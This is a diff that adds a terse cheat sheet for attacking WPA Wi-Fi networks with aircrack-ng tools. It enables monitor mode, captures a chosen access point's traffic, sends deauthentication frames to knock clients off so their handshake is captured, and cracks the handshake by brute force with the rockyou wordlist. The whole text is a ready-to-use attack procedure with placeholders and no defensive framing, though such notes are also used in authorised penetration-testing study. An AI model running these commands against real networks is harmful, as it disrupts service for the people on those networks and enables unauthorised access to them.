@@ -1,0 +1,21 @@
+airmon-ng start <interface>
+airodump-ng <interface>
+# select target bssid
+airodump-ng --bssid <bssid> -c <channel> -w <path_to_write> <interface>
+# in another terminal
+aireplay-ng --deauth <number> -a <bssid> <interface>
+# OR
+aireplay-ng --deauth <number> -a <bssid> -c <client_mac> <interface>
+
+
+to crack bruteforce with aircrack
+
+aircrack-ng <path_to_cap> -w <path_to_wordlist>
+
+
+kali rockyou wordlist:
+
+#unzip the txt file
+gunzip /usr/share/wordlists/rockyou.txt.gz
+
+
